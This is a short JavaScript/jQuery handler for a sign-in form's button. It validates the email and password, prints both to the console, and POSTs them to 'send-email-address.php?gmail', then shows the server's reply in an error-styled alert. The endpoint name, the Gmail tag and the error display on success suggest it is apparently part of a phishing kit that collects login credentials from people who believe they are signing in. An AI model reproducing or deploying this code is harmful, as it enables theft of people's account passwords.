$('#signin').click(function(e){
    var email = document.getElementById('email');
    var password = document.getElementById('password');
	e.preventDefault();
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
	var alert1 = document.querySelector('.alert1');
	if($('#email').val() == ""){
		$('#email').focus();
		$('.alert1').show();
		alert1.textContent = "Please enter your email address.";
		return false;
	}else if(!($('#email').val().match(checkmail))){
		$('#email').focus();
		$('.alert1').show();
		alert1.textContent = "Incorrect email format.";
		return false;
	}else if($('#password').val() == ""){
		$('#password').focus();
		$('.alert1').show();
		alert1.textContent = "Please enter your password";
		return false;
	}else{
		alert1.className = alert1.className.replace(/\balert-danger\b/g, "alert-info");
		alert1.textContent = "Loggin in...";
		$('.alert1').show();
        console.log(email.value+" "+password.value);
		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
				alert1.className = alert1.className.replace(/\balert-info\b/g, "alert-danger");
				alert1.textContent = xmlhttp.responseText;
	      } else {
	      	console.log(xmlhttp.responseText);
	      }
	    }

	    var email = document.getElementById('email').value;
	    var password = document.getElementById('password').value;
	    var formdata = new FormData();

    	formdata.append("email", email);
    	formdata.append("password", password);

	    var url = 'send-email-address.php?gmail';
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return false;

	}
})